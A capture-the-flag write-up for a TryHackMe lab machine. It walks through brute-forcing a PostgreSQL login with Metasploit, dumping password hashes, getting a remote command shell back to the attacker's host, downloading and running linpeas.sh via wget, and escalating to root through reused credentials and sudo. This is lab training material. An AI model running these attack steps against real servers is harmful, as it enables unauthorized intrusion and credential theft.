# Poster - [TryHackMe](https://tryhackme.com/room/poster) Writeup

This room explores a server running PostgreSQL. By abusing misconfigurations and weak credentials, we successfully exploit the DBMS to gain system access and escalate privileges to root using Metasploit modules.

## Port Scanning
```python
nmap -sC -sV -p- -T4 10.10.160.136
```
Open ports:

* 22 — SSH

* 80 — HTTP

* 5432 — PostgreSQL

# Exploiting PostgreSQL

## Brute-force login:
```python
use auxiliary/scanner/postgres/postgres_login
set RHOSTS 10.10.160.136
run

[+] 10.10.160.136:5432 - Login Successful: ****:*******
```

## Gathering system info:
```python
use auxiliary/admin/postgres/postgres_sql
set RHOSTS 10.10.160.136
set PASSWORD password
run

PostgreSQL 9.5.21 on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609, 64-bi
```

## Dumping user hashes:
```python
use auxiliary/scanner/postgres/postgres_hashdump
set RHOSTS 10.10.160.136
set PASSWORD password
run

darkstart  md5...
poster     md5...

```

## Reading files:
```python
use exploit/multi/postgres/postgres_copy_from_program_cmd_exec
set RHOSTS 10.10.160.136
set PASSWORD password
set LHOST 10.10.10.10
run
```
Then:

```python
shell
```
## Privilege Escalation

In the file /home/dark/credentials.txt.
```python
dark:*********
```
```python
su dark
```

## Uploaded linpeas.sh

```python
python3 -m http.server 8080
wget http://10.10.10.10:8080/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

Found the creeds:

```python
$dbuname = "alison";
$dbpass = "********";
```
Switched to alison, got the user flag:

```python
su alison
cat user.txt
```

Checked sudo -l:

```python
(ALL : ALL) ALL
```
```python
sudo su
cat /root/root.txt
```
> Poster demonstrates how a misconfigured PostgreSQL server and poor credential management can lead to full system compromise. With a few Metasploit modules, we went from initial access to root shell
